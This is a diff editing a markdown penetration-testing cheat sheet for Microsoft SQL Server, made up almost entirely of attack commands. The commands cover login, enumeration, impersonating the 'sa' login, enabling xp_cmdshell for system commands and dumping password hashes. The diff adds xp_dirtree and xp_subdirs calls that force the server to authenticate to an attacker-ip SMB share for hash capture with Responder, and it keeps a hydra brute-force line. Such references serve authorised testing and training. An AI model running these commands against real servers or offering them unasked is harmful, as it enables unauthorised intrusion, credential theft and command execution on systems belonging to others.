@@ -9,7 +9,7 @@ Microsoft SQL Server (MSSQL) is a common target in penetration testing due to mi
 - **Using** `sqsh` **(Linux)**
 Connects to an MSSQL server using a specified username and password.
 
-```
+```bash
 sqsh -S target-ip -U user -P password
 ```
 
@@ -17,14 +17,14 @@ sqsh -S target-ip -U user -P password
 - **Using** `impacket-mssqlclient`
 Connects to MSSQL using Impacket’s `mssqlclient.py`.
 
-```
+```bash
 python3 mssqlclient.py DOMAIN/user:password@target-ip
 ```
 
 
 - **Using PowerShell (Windows)**
 Connects to MSSQL using Impacket’s `sqlcmd`.
-```
+```bash
 sqlcmd -S target-ip -U user -P password
 ```
 
@@ -38,49 +38,59 @@ sqlcmd -S .\SQLEXPRESS -E -Q "SELECT * FROM CredentialsDB.dbo.Credentials"
 ---
 
 ## 2. Enumerating MSSQL
+- **List all databases**:
 
-- **Checking MSSQL Version**
-Retrieves MSSQL version information.
-
-```
-SELECT @@VERSION;
+```sql
+SELECT name FROM sys.databases;
 ```
 
+- **Switch to a database**:
 
-- **Listing Databases**
-Displays all available databases.
-
-```
-SELECT name FROM master.dbo.sysdatabases;
+```sql
+USE <database_name>;
 ```
 
+- **List all tables**:
 
-- **Listing Tables**
-Lists tables in a specific database.
-
-```
-SELECT name FROM <database_name>.sys.tables;
+```sql
+SELECT * FROM information_schema.tables;
 ```
 
-- **Querying Data**
-Retrieves all the information from a Table.
+- **List all users**:
 
-```
-SELECT *name* FROM <database_name>.dbo.<table_name>;
-```
-
-- **Listing Users**
-Retrieves all users.
-```
-SELECT name FROM master.sys.syslogins;
+```sql
+SELECT name FROM sys.syslogins;
 ```
 
+- **Connect as other listed user**:
 
-- **Checking Privileges**
-Checks if the current user has `sysadmin` privileges.
+```bash
+select system_user # Verify the actual user is enabled
+execute as login = 'user'
+select system_user # Verify the selected user is enabled
+``` 
+- **Query all data from a table**:
 
+```sql
+SELECT * FROM <table_name>;
 ```
-SELECT is_srvrolemember('sysadmin');
+
+- **Check if `xp_cmdshell` is enabled**:
+
+```sql
+EXEC sp_configure 'xp_cmdshell';
+```
+
+- **Enable `xp_cmdshell` (if permissions allow)**:
+
+```sql
+enable_xp_cmdshell;
+```
+
+- **Execute system command**:
+
+```sql
+EXEC xp_cmdshell 'whoami';
 ```
 
 
@@ -90,7 +100,6 @@ SELECT is_srvrolemember('sysadmin');
 ## 3. Credential Hunting & Privilege Escalation
 
 - **Enumerate local users**
-
 Retrives the machine local users using mssql.
 
 ```bash
@@ -98,7 +107,6 @@ nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
 ```
 
 - **User Impersonation**
-
 This command verifies whether the current user has permission to perform privilege escalation using the `mssql_priv` module of NetExec.
 
 ```bash
@@ -112,7 +120,6 @@ EXECUTE AS LOGIN = '<target_user>';
 ```
 
 - **Finding Stored Credentials**
-
 Retrieves stored password hashes (if accessible).
 
 ```
@@ -121,7 +128,6 @@ SELECT name, password_hash FROM sys.sql_logins;
 
 
 - **Enabling** `xp_cmdshell` **for Command Execution**
-
 Enables `xp_cmdshell` to execute system commands.
 
 ```
@@ -131,13 +137,26 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
 
 - **Executing System Commands with** `xp_cmdshell`
-
 Runs system commands with MSSQL privileges.
 
 ```
 EXEC xp_cmdshell 'whoami';
 ```
 
+- **Capturing MSSQL Service Hash**
+Force MSSQL to authenticate to attacker's SMB share
+
+```
+# Start Responder on attacker machine
+sudo responder -I eth0
+
+# On MSSQL
+EXEC xp_dirtree '\\attacker-ip\share';
+EXEC xp_fileexist '\\attacker-ip\share\file';
+
+# Or using xp_subdirs
+EXEC master..xp_subdirs '\\attacker-ip\share';
+```
 
 ---
 
@@ -165,6 +184,11 @@ Runs commands on a linked MSSQL server.
 EXEC ('whoami') AT linked_server_name;
 ```
 
+- **Impersonate sysadmin user**
+This command impersonates the sysadmin user
+```
+EXECUTE AS LOGIN = 'sa';SELECT SYSTEM_USER;SELECT IS_SRVROLEMEMBER('sysadmin');
+```
 
 ---
 
@@ -173,12 +197,7 @@ EXEC ('whoami') AT linked_server_name;
 - **Using** `hydra`
 Attempts brute-force login.
 
-```
+```bash
 hydra -L users.txt -P passwords.txt mssql://target-ip
 ```
 
-Alternative brute-force attack.
-
-```
-medusa -h target-ip -U users.txt -P passwords.txt -M mssql
-```
